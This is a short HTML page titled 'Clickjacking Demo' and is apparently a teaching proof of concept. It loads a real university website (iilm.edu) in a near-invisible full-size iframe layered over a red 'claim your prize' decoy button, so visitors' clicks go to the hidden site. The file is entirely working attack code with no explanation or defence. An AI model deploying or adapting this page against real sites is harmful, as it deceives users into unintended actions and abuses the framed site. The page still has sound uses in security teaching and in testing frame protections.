<!DOCTYPE html>
<html>
<head>
  <title>Clickjacking Demo</title>

  <style>
    body {
      font-family: Arial;
    }

    iframe {
      position: absolute;
      top: 0;
      left: 0;
      width: 1000px;
      height: 700px;

      opacity: 0.05;        /* Makes iframe nearly invisible */
      z-index: 2;
    }

    .decoy {
      position: absolute;
      top: 200px;
      left: 300px;
      z-index: 1;
      background: red;
      color: white;
      padding: 20px;
      font-size: 22px;
      cursor: pointer;
    }
  </style>
</head>

<body>

  <div class="decoy">
    🎁 Click here to claim your prize
  </div>

  <iframe src="https://iilm.edu"></iframe>

</body>
</html>
